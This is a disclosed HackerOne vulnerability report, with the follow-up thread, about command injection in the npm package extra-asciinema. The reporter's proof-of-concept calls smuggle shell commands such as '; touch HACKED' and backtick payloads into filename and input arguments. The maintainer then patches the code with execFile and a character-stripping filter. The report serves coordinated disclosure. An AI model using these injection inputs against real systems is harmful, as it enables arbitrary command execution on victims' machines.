{
    "id": 863956,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM5NTY=",
    "url": "https://hackerone.com/reports/863956",
    "title": "[extra-asciinema] Command Injection via insecure command formatting",
    "state": "Closed",
    "substate": "resolved",
    "severity_rating": "critical",
    "readable_substate": "Resolved",
    "created_at": "2020-05-01T11:39:52.991Z",
    "submitted_at": "2020-05-01T11:39:52.991Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "d3lla",
        "url": "/d3lla",
        "profile_picture_urls": {
            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 23949,
        "url": "https://hackerone.com/nodejs-ecosystem",
        "handle": "nodejs-ecosystem",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "disabled",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "Node.js third-party modules",
            "twitter_handle": "",
            "website": "https://nodejs.org/en/security/",
            "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
        }
    },
    "has_bounty?": false,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [],
    "singular_disclosure_disabled": false,
    "disclosed_at": "2020-08-22T08:48:20.138Z",
    "bug_reporter_agreed_on_going_public_at": "2020-08-22T08:48:20.101Z",
    "team_member_agreed_on_going_public_at": "2020-08-21T20:51:48.193Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "I would like to report a `Command Injection` issue in the `extra-asciinema` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `extra-asciinema`\n**version:** `1.0.5`\n**npm page:** `https://www.npmjs.com/package/extra-asciinema`\n\n## Module Description\n\nasciinema is a terminal screen recorder.\n\nWith this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.\n\n## Module Stats\n\n[23] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `uploadSync` function.\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214\n...\nconst cp9 = require('child_process');\n...\n/**\n * Upload recorded asciicast to asciinema.org site.\n * @param {string} f filename\n * @returns {string} asciicast URL\n */\nfunction uploadSync(f) {\n  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});\n  return stdout.replace(/.*?(https?:\\S+).*/s, '$1');\n}\n...\n```\nThe `f` parameter is used to build the command that is passed to the `child_process.execSync` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `extra-asciinema` module:\n    -  `npm i extra-asciinema`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst asciinema = require('extra-asciinema');\nasciinema.uploadSync('; touch HACKED');\n\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810853}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFileSync`](https://nodejs.org/api/child_process.html#child_process_child_process_execfilesync_file_args_options) or [`child_process.spawnSync`](https://nodejs.org/api/child_process.html#child_process_child_process_spawnsync_command_args_options) functions instead of `child_process.execSync`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `extra-asciinema` module via insecure command formatting.",
    "weakness": {
        "id": 58,
        "name": "Command Injection - Generic"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [
        {
            "id": 810853,
            "file_name": "poc_extra-asciinema.mov",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9dLdPLeEf1vtLDxueNssKeNH?response-content-disposition=attachment%3B%20filename%3D%22poc_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_extra-asciinema.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071925Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d78cc42aadebca415a2ba4bd0e2ab37f85c87c947162469b5e3072e5b553aa8d",
            "file_size": 818622,
            "type": "video/quicktime"
        }
    ],
    "allow_singular_disclosure_at": "2020-09-20T20:51:48.272Z",
    "allow_singular_disclosure_after": -92658457.23535259,
    "singular_disclosure_allowed": true,
    "vote_count": 0,
    "voters": [],
    "severity": {
        "rating": "critical",
        "author_type": "User"
    },
    "structured_scope": {
        "databaseId": 2986,
        "asset_type": "SOURCE_CODE",
        "asset_identifier": "Other module",
        "max_severity": "critical"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 7864311,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hi @d3lla,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@celt",
            "automated_response": false,
            "created_at": "2020-05-01T14:13:45.081Z",
            "updated_at": "2020-05-01T14:13:45.081Z",
            "actor": {
                "username": "celt",
                "cleared": false,
                "verified": false,
                "url": "/celt",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 7864345,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugTriaged",
            "message": "Hello @d3lla,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@celt",
            "automated_response": false,
            "created_at": "2020-05-01T14:16:56.796Z",
            "updated_at": "2020-05-01T14:16:56.796Z",
            "actor": {
                "username": "celt",
                "cleared": false,
                "verified": false,
                "url": "/celt",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/CbJ76SLbXk5Eh7qbt9ejXyQB/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 8736582,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ExternalUserJoined",
            "message": "",
            "automated_response": false,
            "created_at": "2020-07-24T08:07:23.691Z",
            "updated_at": "2020-07-24T08:07:23.691Z",
            "actor": {
                "username": "wolfram77",
                "cleared": false,
                "verified": false,
                "url": "/wolfram77",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 8738322,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Used `execFile` for this one too. No more `HACKED` file.\n\nhttps://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480\n\n```bash\n> var asciinema = require('./')\nundefined\n> asciinema.uploadSync('; touch HACKED');\nasciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\nUncaught Error: Command failed: asciinema upload ; touch HACKED\nasciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\n\n    at checkExecSyncError (child_process.js:616:11)\n    at Object.execFileSync (child_process.js:634:15)\n    at Object.uploadSync (/home/wolfram/Documents/extra-asciinema/index.js:142:21) {\n  status: 1,\n  signal: null,\n  output: [\n    null,\n    '',\n    \"\\x1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\\x1B[0m\\n\"\n  ],\n  pid: 68455,\n  stdout: '',\n  stderr: \"\\x1B[0;31masciinema: upload failed: [Errno 2] No such file or directory: '; touch HACKED'\\x1B[0m\\n\"\n}\n```",
            "automated_response": false,
            "created_at": "2020-07-24T08:56:09.167Z",
            "updated_at": "2020-07-24T08:56:09.167Z",
            "actor": {
                "username": "wolfram77",
                "cleared": false,
                "verified": false,
                "url": "/wolfram77",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 8753569,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hi @wolfram77, thanks for providing a new version which seems to fix this vulnerability.\n\nCan you confirm that this resolves it @d3lla?",
            "automated_response": false,
            "created_at": "2020-07-25T19:07:08.821Z",
            "updated_at": "2020-07-25T19:07:27.119Z",
            "actor": {
                "username": "danielruf",
                "cleared": false,
                "verified": false,
                "url": "/danielruf",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 8757830,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hi @danielruf and @wolfram77,\nthanks for your reply and for the fix.\n\nWhen I reported the issue I tested only the `uploadSync` function that now seems to be fixed.\nI run the previous poc:\n```javascript\nconst asciinema = require('extra-asciinema');\nasciinema.uploadSync('; touch HACKED');\n```\nand indeed I was not able to reproduce the previous reported result.\n\nHowever, now I tested also the other functions and it's still possible to inject arbitrary commands.\nIn particular I tested also the `asciinema.recSync` and `asciinema.rec` functions.\nHere is the `poc2.js` I used:\n```javascript\nconst asciinema = require('extra-asciinema');\n// asciinema.uploadSync('; touch HACKED');'; touch HACKED\n\nasciinema.recSync('saved.cast', {input: '\"; touch HACKED1\"'});\nasciinema.recSync('saved.cast', {input: './`touch HACKED2`/../'});\nasciinema.rec('saved.cast', {input: '`touch HACKED3`'});\nasciinema.rec('saved.cast', {input: './`touch HACKED4`/../'});\n\n```\n\nI think this is a corner case, because reading the documentation of `asciinema` (https://asciinema.org/docs/usage), it accepts a parameter called `command` that is the \"command to record\".\n\nIn this case the property `command` is build using the `o.input` parameter:\n```javascript\n// https://github.com/nodef/extra-asciinema/blob/master/src/_recCmd.ts#L9\n\nimport * as path from 'path';\n\nfunction recCmd(f: string, o: any=null): string[] {\n  var o = o||{};\n  // if input file given, execute on node.js\n  if(o.input) {\n    var dir = path.dirname(o.input);\n    var fil = path.basename(o.input);\n    o.command = `cd ${dir} && cat \"${fil}\" | node -i`; // <-- HERE\n  }\n  o.overwrite = true;\n  o.yes = true;\n  var args = ['rec'];\n  ...\n  if(o.command) args.push('--command', o.command);\n  ...\n  return args;\n}\nexport default recCmd;\n\n// https://github.com/nodef/extra-asciinema/blob/master/src/rec.ts#L26\nfunction rec(f: string=null, o: RecOptions=null, fn: callbackFn=null): Promise<any> {\n  var f = f||path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'asciinema-')), '0.cast');\n  var p = new Promise((fres, frej) => {\n    cp.execFile('asciinema', recCmd(f, o), {encoding: 'utf8'}, (err) => {\n      if(err) return frej(err);\n      fres(f);\n    });\n  });\n  return p? p.then(a => fn(null, a), fn) : p;\n}\nexport default rec;\n\n// https://github.com/nodef/extra-asciinema/blob/master/src/recSync.ts#L24\nfunction recSync(f: string, o: RecOptions=null): string {\n  var f = f||path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'asciinema-')), '0.cast');\n  cp.execFileSync('asciinema', recCmd(f, o), {encoding: 'utf8'});\n  return f;\n}\nexport default recSync;\n```\n\nIf `o.input` is `\"; touch HACKED1\"`, the `o.command` will be `cd . && cat \"\"; touch HACKED1\"\" | node -i`, while\nif `o.input` is ``./`touch HACKED3`/../``,  the `o.command` will be ``'cd ./`touch HACKED3` && cat \"..\" | node -i``.\n\nIn this case, since you are calling the `cd` and `cat` commands (in the first case you need a directory while in the second case a filename), in my opinion, it is better to sanitize the value of `o.input` in order to avoid the above issues.\n\nI attached a poc video.\n{F923982}\n\n@danielruf and @wolfram77 please let me know what do you think about that.\n\nSome resources that could be helpful:\n- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\n- https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b\n\nA possible solution could be similar to this one (it's just a suggestion, feel free to choose what whatever you think best):\n- https://github.com/418sec/node-git-wrapper/pull/3/files\n\n```javascript\nvar escapeSpecialChars = function(cmd) {\n    return cmd.replace(/([`$&{}[;|])/g,'');\n}\nfunction recCmd(f, o = null) {\n    var o = o || {};\n    \n    if (o.input) {\n        \n        var dir = path.dirname(escapeSpecialChars(o.input));\n        var fil = path.basename(escapeSpecialChars(o.input));\n        o.command = `cd ${dir} && cat \"${fil}\" | node -i`;\n    }\n    ...\n```\n\n\n\nThank you for your time,\nd3lla\n\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n",
            "automated_response": false,
            "created_at": "2020-07-26T16:44:59.648Z",
            "updated_at": "2020-07-26T16:44:59.648Z",
            "actor": {
                "username": "d3lla",
                "cleared": false,
                "verified": false,
                "url": "/d3lla",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "attachments": [
                {
                    "id": 923982,
                    "filename": "poc2_extra-asciinema.mov",
                    "type": "video/quicktime",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NXqfAFi9pGJKj36m22v2qbYu?response-content-disposition=attachment%3B%20filename%3D%22poc2_extra-asciinema.mov%22%3B%20filename%2A%3DUTF-8%27%27poc2_extra-asciinema.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071925Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ebb95855907523fb4ee942a7d36502630fefcd33d0c7e83de8f676420e07953"
                }
            ],
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 8758618,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "I managed to not put the change in 1 commit, so i put the changed code here. Also in your POC video i noticed a `fn is not defined` error. Null check was on the wrong variable. Also changed that. Now when i run your POC, no `HACKED` file is created.\n\n```javascript\nfunction escapePath(p) {\n  return p.replace(/[`$&{}[;|]/g, '');\n}\n\nfunction recCmd(f: string, o: any=null): string[] {\n  var o = o||{};\n  // if input file given, execute on node.js\n  if(o.input) {\n    var pth = escapePath(o.input);\n    var dir = path.dirname(pth);\n    var fil = path.basename(pth);\n    o.command = `cd \"${dir}\" && cat \"${fil}\" | node -i`;\n  }\n```\n",
            "automated_response": false,
            "created_at": "2020-07-26T18:56:02.495Z",
            "updated_at": "2020-07-26T18:56:02.495Z",
            "actor": {
                "username": "wolfram77",
                "cleared": false,
                "verified": false,
                "url": "/wolfram77",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 8990302,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "@d3lla i think this should be fixed too. you can mark it as done.",
            "automated_response": false,
            "created_at": "2020-08-20T15:08:51.959Z",
            "updated_at": "2020-08-20T15:08:51.959Z",
            "actor": {
                "username": "wolfram77",
                "cleared": false,
                "verified": false,
                "url": "/wolfram77",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 9003372,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hi @wolfram77,\n\nsorry for the late reply.\n\nYour changes seems to fix the problem.\nI run the previous poc:\n\n```javascript\nconst asciinema = require('extra-asciinema');\n// asciinema.uploadSync('; touch HACKED');'; touch HACKED\n\nasciinema.recSync('saved.cast', {input: '\"; touch HACKED1\"'});\nasciinema.recSync('saved.cast', {input: './`touch HACKED2`/../'});\nasciinema.rec('saved.cast', {input: '`touch HACKED3`'});\nasciinema.rec('saved.cast', {input: './`touch HACKED4`/../'});\n\n```\nand I was not able to reproduce the previous reported result.\n\nI attached a PoC video.\n{F958366}\n\nThanks for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4",
            "automated_response": false,
            "created_at": "2020-08-21T16:05:30.569Z",
            "updated_at": "2020-08-21T16:05:30.569Z",
            "actor": {
                "username": "d3lla",
                "cleared": false,
                "verified": false,
                "url": "/d3lla",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "attachments": [
                {
                    "id": 958366,
                    "filename": "fix_extra-asciinema_2.mov",
                    "type": "video/quicktime",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EhnVAygkSjG9CL4Q89xYnjpi?response-content-disposition=attachment%3B%20filename%3D%22fix_extra-asciinema_2.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_extra-asciinema_2.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071925Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=554508eaa3f9fcae19cdb94690882b558642e0f15e5f49815e633c41b918fc90"
                }
            ],
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 9005580,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugResolved",
            "message": "",
            "automated_response": false,
            "created_at": "2020-08-21T20:51:38.855Z",
            "updated_at": "2020-08-21T20:51:38.855Z",
            "actor": {
                "username": "danielruf",
                "cleared": false,
                "verified": false,
                "url": "/danielruf",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "reporter": {
                "username": "d3lla",
                "url": "/d3lla"
            },
            "genius_execution_id": null,
            "team_handle": "nodejs-ecosystem"
        },
        {
            "id": 9005582,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-08-21T20:51:48.214Z",
            "updated_at": "2020-08-21T20:51:48.214Z",
            "first_to_agree": true,
            "actor": {
                "username": "danielruf",
                "cleared": false,
                "verified": false,
                "url": "/danielruf",
                "profile_picture_urls": {
